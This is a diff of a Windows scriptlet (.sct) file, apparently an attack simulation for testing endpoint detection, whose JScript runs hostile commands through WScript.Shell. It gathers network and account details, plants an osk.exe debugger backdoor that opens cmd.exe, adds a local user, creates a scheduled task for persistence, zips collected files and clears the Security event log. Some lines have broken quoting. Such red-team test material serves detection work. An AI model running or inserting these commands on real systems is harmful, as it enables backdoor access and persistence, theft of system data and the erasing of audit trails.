@@ -5,14 +5,16 @@
     classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
 	<script language="JScript">
 		<![CDATA[
-			var r = new ActiveXObject("WScript.Shell").Run("calc.exe");
-			var r = new ActiveXObject("WScript.Shell").Run("ipconfig /all > %USERPROFILE%\ipconfig.txt");
+			var r = new ActiveXObject("WScript.Shell").Run("mkdir c:\edrtest");
+			var r = new ActiveXObject("WScript.Shell").Run("ipconfig /all > c:\edrtest\ipconfig.txt");
+			var r = new ActiveXObject("WScript.Shell").Run("arp -a > c:\edrtest\arp.txt");
+			var r = new ActiveXObject("WScript.Shell").Run("REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"");
 			var r = new ActiveXObject("WScript.Shell").Run("net user /add shigeru123");
+			var r = new ActiveXObject("WScript.Shell").Run("wmic useraccount get /ALL > c:\edrtest\useraccount.txt");
 			var r = new ActiveXObject("WScript.Shell").Run("ping nato-press.com");
-			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn “testtask1” /tr “%USERPROFILE%\edrtest.vbs” /sc MINUTE");
-			var r = new ActiveXObject("WScript.Shell").Run("powershell Compress-Archive -Path %USERPROFILE%\*.txt -Destination %USERPROFILE%\edrtest.zip");
+			var r = new ActiveXObject("WScript.Shell").Run("schtasks /create /tn “testtask1” /tr c:\edrtest\edrtest.vbs” /sc MINUTE");
+			var r = new ActiveXObject("WScript.Shell").Run("powershell Compress-Archive -Path c:\edrtest\*.txt -Destination c:\edrtest\edrtest.zip");
 			var r = new ActiveXObject("WScript.Shell").Run("wevtutil cl Security");
-
 ]]>
 </script>
 </registration>
